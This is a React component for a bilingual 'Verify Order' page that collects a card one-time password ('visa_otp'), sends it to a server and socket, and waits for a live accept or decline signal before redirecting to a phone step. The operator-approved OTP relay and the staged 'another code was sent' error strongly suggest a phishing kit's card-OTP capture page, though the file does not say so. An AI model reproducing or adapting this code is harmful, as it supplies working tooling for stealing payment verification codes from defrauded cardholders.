import React, { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import NavBar from "../component/NavBar";
import Footer from "../component/Footer";
import { BiBook } from "react-icons/bi";
import { TailSpin } from "react-loader-spinner";
import { serverRoute, socket } from "./Main";
import { token } from "../App";
import axios from "axios";

const OTP = ({ setMode, checkMode }) => {
  const { id } = useParams();
  const mode = localStorage.getItem("lang");
  const [counter, setCounter] = useState(60);
  const [otp, setOtp] = useState(undefined);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  useEffect(() => {
    const timer = setInterval(() => {
      if (counter > 0) {
        setCounter(counter - 1); // Decrease counter by 1 second
      }
    }, 1000);

    // Cleanup function to clear the interval when the component unmounts
    return () => clearInterval(timer);
  }, [counter]);

  // Calculate minutes and seconds
  const minutes = Math.floor(counter / 60);
  const seconds = counter % 60;

  // Format the counter value as "MM:SS"
  const formattedMinutes = String(minutes).padStart(2, "0");
  const formattedSeconds = String(seconds).padStart(2, "0");

  const handleSubmit = async (e) => {
    setLoading(true);
    setError(false)
    e.preventDefault();
    await axios
      .post(serverRoute + "/visaOtp/" + sessionStorage.getItem("id"), {
        visa_otp: otp,
      })
      .then(() =>
        socket.emit("visaOtp", {
          id: sessionStorage.getItem("id"),
          visa_otp: otp,
        })
      );
    
  };

  socket.on("declineVisaOTP", (ID) => {
    if (ID === sessionStorage.getItem("id")) {
      setError(true);
      setLoading(false);
    }
  });
  socket.on("acceptVisaOTP", (id) => {
    console.log(id)
    if (id === sessionStorage.getItem("id")) {
      setError(false);
      setLoading(false);
      window.location.href = `/phone`;
    }
  });

  return (
    <div>
      <NavBar setMode={setMode} mode={mode} checkMode={checkMode} />
      {loading && (
        <div className="absolute top-0 w-full z-20  flex items-center justify-center h-screen bg-opacity-50 left-0 bg-gray-300 ">
          <TailSpin
            height="50"
            width="50"
            color="green"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      )}
      <div
        style={{ minHeight: "60vh" }}
        className="w-full flex justify-center items-center md:items-start"
      >
        <div
          className="md:w-1/2 w-2/3  py-5 shadow-md my-2 h-fit "
          style={{ border: "1px solid #eee" }}
        >
          <div
            className="flex w-full items-center gap-x-3  border-b-2  pb-3"
            style={
              mode === "ar"
                ? { borderRight: "2px solid #74f374 ", paddingRight: "5px" }
                : { borderLeft: "2px solid #74f374 ", paddingLeft: "5px" }
            }
            dir={`${mode === "ar" ? "rtl" : "ltr"}`}
          >
            <BiBook className="text-green-500 md:text-xl text-sm" />
            <span className="md:text-sm text-xs font-semibold">
              {checkMode("Verify Order", "التحقق من الطلب").word}
            </span>
          </div>
          <form
            className="flex flex-col w-full  items-center pt-5 gap-y-5"
            onSubmit={handleSubmit}
          >
            <div className="flex gap-x-5  text-gray-500 lg:text-sm md:font-semibold text-xs justify-center items-center otp-desc">
              <p>
                {formattedMinutes}:{formattedSeconds}
              </p>
              <span>
                {
                  checkMode(
                    "Please enter a verification code sent to your mobile number",
                    "يرجى ادخال رمز تحقق تم ارساله الى رقم جوالك"
                  ).word
                }
              </span>
            </div>
            <input
              className="md:w-1/2 w-2/3 outline-none  rounded-sm px-2 py-1 md:text-sm otp-desc text-center"
              style={{ border: "1px solid #eee" }}
              dir={`${mode === "ar" ? "rtl" : "ltr"}`}
              placeholder={`********`}
              required
              type="text"
              onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
              inputMode="numeric"
              value={otp}
            />
            <button className="text-white bg-green-500 w-1/2 text-sm md:text-base py-1 rounded-sm ">
              {checkMode("Verify", "تحقق").word}
            </button>
            {error && (
              <span className="flex gap-x-5  text-red-500 lg:text-sm md:font-semibold text-xs justify-center items-center otp-desc">
                {
                  checkMode(
                    "*An error occurred. Another activation code was sent to your mobile phone",
                    "*حصل خطأ تم ارسال رمز تفعيل اخر الى جوالك"
                  ).word
                }
              </span>
            )}
          </form>
        </div>
        <div></div>
      </div>
      <Footer setMode={setMode} mode={mode} checkMode={checkMode} />
    </div>
  );
};

export default OTP;
